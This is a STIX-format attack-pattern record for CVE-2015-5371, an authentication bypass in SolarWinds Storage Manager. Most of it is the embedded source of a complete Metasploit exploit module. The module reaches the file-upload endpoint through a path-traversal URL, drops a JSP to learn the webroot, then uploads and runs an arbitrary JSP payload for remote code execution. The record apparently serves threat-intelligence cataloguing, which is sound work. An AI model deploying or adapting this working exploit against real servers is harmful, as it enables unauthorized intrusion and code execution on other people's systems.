{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--877b1c7c-1e17-4e4a-ae83-bed96584b11b",
    "created": "2024-08-14T17:07:33.123681Z",
    "modified": "2024-08-14T17:07:33.123685Z",
    "name": "SolarWinds Storage Manager Authentication Bypass",
    "description": " This module exploits an authentication bypass vulnerability in Solarwinds Storage Manager. The vulnerability exists in the AuthenticationFilter, which allows to bypass authentication",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/solarwinds_store_manager_auth_filter.rb",
            "external_id": "solarwinds_store_manager_auth_filter.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-5371"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'SolarWinds Storage Manager Authentication Bypass',\n      'Description' => %q{\n        This module exploits an authentication bypass vulnerability in Solarwinds Storage Manager.\n        The vulnerability exists in the AuthenticationFilter, which allows to bypass authentication\n        with specially crafted URLs. After bypassing authentication, is possible to use a file\n        upload function to achieve remote code execution. This module has been tested successfully\n        in Solarwinds Store Manager Server 5.1.0 and 5.7.1 on Windows 32 bits, Windows 64 bits and\n        Linux 64 bits operating systems.\n      },\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2015-5371'],\n          ['ZDI', '14-299']\n        ],\n      'Privileged'  => true,\n      'Platform'       => %w{ linux win },\n      'Arch'        => ARCH_JAVA,\n      'Targets'     =>\n        [\n          ['Solarwinds Store Manager <= 5.7.1', {}]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-08-19'))\n\n    register_options(\n      [\n        Opt::RPORT(9000)\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n                               'uri'    => normalize_uri(\"/\", \"images\", \"..\", \"jsp\", \"ProcessFileUpload.jsp\"),\n                               'method' => 'POST',\n                               'ctype'  => \"multipart/form-data; boundary=----#{rand_text_alpha(10 + rand(10))}\"\n                           })\n\n    if  res && res.code == 200 && res.body && res.body.to_s =~ /Upload Successful!!/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    jsp_info = \"#{rand_text_alphanumeric(4 + rand(32-4))}.jsp\"\n    print_status(\"Uploading Information Gathering JSP #{jsp_info}...\")\n    if upload(jsp_info, jsp_path)\n      print_good(\"JSP payload uploaded successfully\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Information Gathering JSP upload failed\")\n    end\n\n    res = execute(jsp_info)\n\n    if res && res.code == 200 && res.body.to_s =~ /Path:(.*)/\n      upload_path = $1\n      print_good(\"Working directory found in #{upload_path}\")\n      register_file_for_cleanup(::File.join(upload_path, jsp_info))\n    else\n      print_error(\"Couldn't retrieve the upload directory, manual cleanup will be required\")\n      print_warning(\"#{jsp_info} needs to be deleted manually\")\n    end\n\n    jsp_payload = \"#{rand_text_alphanumeric(4 + rand(32-4))}.jsp\"\n    print_status(\"Uploading JSP payload #{jsp_payload}...\")\n    if upload(jsp_payload, payload.encoded)\n      print_good(\"JSP payload uploaded successfully\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - JSP payload upload failed\")\n    end\n\n    if upload_path\n      register_file_for_cleanup(::File.join(upload_path, jsp_payload))\n    else\n      print_warning(\"#{jsp_payload} needs to be deleted manually\")\n    end\n\n    print_status(\"Executing payload...\")\n    execute(jsp_payload, 1)\n  end\n\n  def execute(jsp_name, time_out = 20)\n    res = send_request_cgi({\n                         'uri'    => normalize_uri(\"/\", \"images\", \"..\", jsp_name),\n                         'method' => 'GET'\n                     }, time_out)\n\n    res\n  end\n\n  def upload(file_name, contents)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(contents,\n                       \"application/octet-stream\",\n                       nil,\n                       \"form-data; name=\\\"#{rand_text_alpha(4 + rand(4))}\\\"; filename=\\\"#{file_name}\\\"\")\n\n    res = send_request_cgi({\n                               'uri'    => normalize_uri(\"/\", \"images\", \"..\", \"jsp\", \"ProcessFileUpload.jsp\"),\n                               'method' => 'POST',\n                               'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n                               'data'   => post_data.to_s\n                           })\n\n    if  res && res.code == 200 && res.body && res.body.to_s =~ /Upload Successful!!/\n      return true\n    end\n\n    false\n  end\n\n  def jsp_path\n    jsp =<<-EOS\n<%@ page language=\"Java\" import=\"java.util.*\"%>\n<%\nout.println(\"Path:\" + System.getProperty(\"server.webapp.root\"));\n%>\n    EOS\n\n    jsp\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-08-19",
    "x_mitre_platforms": [
        "%w{ linux win }"
    ]
}